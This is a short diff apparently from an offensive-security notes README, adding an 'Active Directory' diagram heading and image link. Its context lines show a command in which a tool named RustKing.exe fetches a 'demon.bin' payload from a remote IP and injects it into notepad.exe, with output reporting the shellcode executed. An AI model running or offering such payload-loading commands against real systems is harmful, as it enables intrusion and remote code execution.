@@ -363,3 +363,7 @@ C:\>RustKing.exe --url http://192.168.231.128:9090/demon.bin --target notepad.ex
     |-> Shellcode Executed!
 ```
 ## Chapter 3: Active Directory
+
+### Active Directory Network Diagram
+![image](https://user-images.githubusercontent.com/107750005/220043885-bd4ab66c-f78f-4d74-8d63-76f1f958ff43.png)
+
